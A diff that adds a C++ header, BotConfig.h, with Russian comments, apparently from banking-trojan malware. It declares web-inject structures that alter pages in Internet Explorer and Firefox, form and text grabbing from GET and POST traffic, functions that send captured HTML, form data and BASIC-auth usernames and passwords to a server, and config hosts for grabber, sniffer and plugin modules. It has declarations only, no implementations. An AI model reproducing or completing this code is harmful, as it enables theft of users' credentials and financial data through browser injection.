@@ -1,0 +1,140 @@
+// -----------------------------------------------------------------------------
+
+#ifndef BotConfigH
+#define BotConfigH
+// -----------------------------------------------------------------------------
+
+#include <windows.h>
+#include "BotHTTP.h"
+
+// типы тегов
+#define DATA_BEFORE_TAG 1
+#define DATA_AFTER_TAG	2
+#define DATA_INJECT_TAG 3
+#define DATA_END_TAG	4
+
+// флаг L, грабит кусок текста
+#define MODE_GETTEXT_GET  1   //LG
+#define MODE_GETTEXT_POST 2   //LP
+#define MODE_GETTEXT_ALL  3   //GPL или L
+
+// без флага, замена текста
+#define MODE_SETTEXT_GET  4  //G
+#define MODE_SETTEXT_POST 5  //P
+#define MODE_SETTEXT_ALL  6  //GP
+
+#define VERB_IS_POST hmGET
+#define VERB_IS_GET  hmPOST
+
+#define MAX_POST_DATA_SIZE 5000
+#define MIN_POST_DATA_SIZE 5
+
+#define PAGE_READED_FLAG 0x01
+#define PAGE_IS_INJECT   0x05
+
+#define INJECT_STATE_NONE	 0x01
+#define INJECT_STATE_ALREADY 0x02
+
+// Типы браузеров
+#define BROWSER_TYPE_IE		1  /* Internet Explorer */
+#define BROWSER_TYPE_FF		2  /* Mozilla Firefox */
+
+// Типы отправляемых на сервер данных
+#define DATA_TYPE_FORMGRAB	1  /* Отправляемые данные являются данными HT<L формы */
+#define DATA_TYPE_INJECT	2  /* Данные являются куском HTML документа */
+
+#define FGRHOSTFROMCFG		1
+#define GRAHOSTFROMCFG		2
+#define SCRHOSTFROMCFG		3
+#define SNIHOSTFROMCFG		4
+#define PLUGINSHOSTFROMCFG	5
+
+// основная структура
+typedef struct {
+	char *Data;
+	DWORD dwDataLen;
+	bool Handled;     // В данный момент этот флаг выносим в эту структуру.
+					  // Признак того, что данный инжект отработал
+}*PDATATAG, DATATAG;
+
+typedef struct INJECTDATA{
+	char *Url;
+	DWORD dwUrlLen;
+	DWORD dwMode;
+	DWORD dwCount;
+
+	PDATATAG data_before;
+	PDATATAG data_inject;
+	PDATATAG data_after;
+}*PINJECTDATA;
+
+typedef struct {
+	DWORD dwInjectsCount;
+	PINJECTDATA Injects;
+}*PINJECTS, INJECTS;
+
+typedef struct {
+	bool bInjects_Exist;
+	PINJECTS pInjects;
+}*PCONFIG, CONFIG;
+
+// Описание сессии загрузки HTML документа
+typedef struct THTTPSessionInfo{
+	DWORD BrowserType;  /* Тип браузера */
+	PCHAR UserAgent;    /* Имя браузера */
+	PCHAR URL;          /* Адрес загружаемого ресурса */
+} *PHTTPSessionInfo;
+
+// Метод, событие сигнализирующее об HTML инжекте
+typedef void(*THTMLInjectEvent)(PINJECTDATA /* Данные инжекта */ ,
+	bool /* Признак сработавшего инжекта */ ,
+	DWORD /* Индекс данных в инжекте */ );
+
+DWORD GetConfigTimeOut();
+char* GetCurrentHostFromConfig(int Num);
+void GetCurrentConfigHostSetings(bool*http, bool*https);
+PCONFIG GetConfig();
+PCONFIG LoadConfig();
+
+PCONFIG LoadConfigFromFile(WCHAR * FileName);
+
+void InitializeConfig();
+void InitializeConfigFromFile(WCHAR * FileName);
+
+bool GetInjectFromConfig(char*Url, char*Verb, PINJECTDATA * pInjects,
+	LPDWORD dwInjCount);
+
+/*DWORD SubstituteText(char*Buffer, DWORD dwOffset, char**nBuffer,
+	char*data_before, char*data_inject, char*data_after);*/
+
+int GetText(char*Buffer, char**Grabbed, char*data_before, char*data_after);
+
+// Функция обрабатывае HTML код согласно включенных настроек.
+// В случае если в код были внесены изменения новый код возвращается в
+// буфер NewBuffer
+bool HandleHTML(PCHAR Buffer, PCHAR & NewBuffer, PINJECTDATA Inject,
+	PHTTPSessionInfo Session);
+
+// Функция вставляет блок HTML кода в указанный код согласно настроек инжекта
+bool HtmlInject(PCHAR Buffer, PCHAR &nBuffer, PINJECTDATA pInject);
+
+// Функция отправляет на сервер данные BASIC авторизации
+void SendBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password);
+
+// функция устанавливает обработчик события для инжекта HTML
+void SetHTMLInjectEvent(THTMLInjectEvent Event);
+
+// Функция возвращает истину если в инжекте включен режим отправки
+// блоков HTML кода на удалённый сервер
+bool IsLogHTMLMode(PINJECTDATA Inject);
+
+// Функция возвращает истину если в инжекте включен режим вставки
+// блоков HTML кода в загруженные данные
+bool IsInjectHTMLMode(PINJECTDATA Inject);
+
+// Функция возвращает истину если указанный тип контента
+// поддерживается методами инжекта HTML
+bool SupportContentType(PCHAR CType);
+
+// -----------------------------------------------------------------------------
+#endif
